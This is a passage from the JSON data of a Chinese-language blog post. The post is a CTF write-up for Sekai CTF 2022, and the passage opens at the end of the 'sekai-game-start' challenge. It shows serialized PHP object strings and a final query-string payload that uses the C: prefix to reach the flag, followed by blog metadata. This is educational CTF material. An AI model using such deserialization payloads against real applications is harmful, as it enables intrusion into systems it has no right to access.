variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter\">?></span>\n\n\n<span class=\"token operator\">==</span><span class=\"token operator\">></span>O<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Sekai_Game\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token operator\">==</span><span class=\"token operator\">></span>C<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Sekai_Game\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>于是最后的payload为</p>\n<pre><code>?sekai[game.run=C:10:&quot;Sekai_Game&quot;:0:&#123;&#125;\n</code></pre>\n<p><img src=\"/post/2022SekaiCTF/image-20221003162948932.png\" alt=\"image-20221003162948932\"></p>\n<p><strong>得到flag</strong></p>\n","text":"国外比赛难度确实逆天 Sekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022 这是官方...","permalink":"/post/2022SekaiCTF","photos":[],"count_time":{"symbolsCount":"8.3k","symbolsTime":"8 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Sekai-CTF-2022\"><span class=\"toc-text\">Sekai CTF 2022</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-bottle-poem-%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0%E4%BA%86%EF%BC%8C%E8%A1%A5%E4%B8%8A%E8%87%AA%E5%B7%B1%E7%9A%84%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">1.bottle-poem[后续学习了，补上自己的思路]</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">*查看当前进程的启动命令</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-sekai-game-start\"><span class=\"toc-text\">2.sekai-game-start</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E8%80%83%E7%82%B9\"><span class=\"toc-text\">关键考点</span></a></li></ol></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"DASCTF X GFCTF 2022十月挑战赛","uid":"0a5f9ba95c642a008814712ab15f1814","slug":"2022DASCTF X GFCTF十月挑战赛-wp","date":"2023-02-13T15:19:34.978Z","updated":"2023-10-13T07:29:37.131Z","comments":true,"path":"api/articles/2022DASCTF X GFCTF十月挑战赛-wp.json","keywords":null,"cover":"/img/37.jpg","text":"有水平的 DASCTF X GFCTF 2022十月挑战赛1.EasyPOP一道构造pop链的题，拿来练习一下分析能力 做反序列构造pop链最重要还是要会联想，...","permalink":"/post/2022DASCTF X GFCTF十月挑战赛-wp","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"NewStarCTF2022公开赛-wp","uid":"8d801008e226a8eb98ad443ed169bddb","slug":"2022NewStarCTF","date":"2023-02-13T15:07:34.783Z","updated":"2023-08-06T08:01:55.254Z","comments":true,"path":"api/articles/2022NewStarCTF.json","keywords":null,"cover":"/img/40.jpg","text":"没啥简介 NewStarCTF2022公开赛虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点 1.NotPHP&lt;?php error_...","permalink":"/post/2022NewStarCTF","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}